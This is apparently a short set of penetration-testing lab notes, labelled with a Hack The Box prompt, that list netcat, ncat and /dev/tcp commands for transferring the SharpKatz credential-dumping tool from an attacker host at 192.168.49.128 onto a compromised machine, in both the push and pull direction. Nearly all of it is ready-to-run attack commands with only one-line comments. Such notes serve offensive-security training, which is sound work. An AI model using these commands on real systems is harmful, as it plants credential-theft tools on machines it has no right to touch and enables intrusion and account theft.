
## Victim --> Attacker

- From Compromised Machine
```bash
# We set a listening server at port 8000 and send the output to a file name Sharpkatz.exe
# For Netcat
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
# For Ncat
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```

- From Our machine
```bash
# Send the file from our machine to the compromised machine
# For Netcat
piwpiw95@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
# For Ncat
piwpiw95@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

---

## Victim <--- Attacker

- From compromised machine
```bash
# For Netcat
nc 192.168.49.128 443 > SharpKatz.exe
# For Ncat
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

- From our machine

```bash
# For Netcat
piwpiw95@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
# For Ncat
piwpiw95@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

---

## Compromised machine connect using /dev/tcp to receive file

```bash
victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```
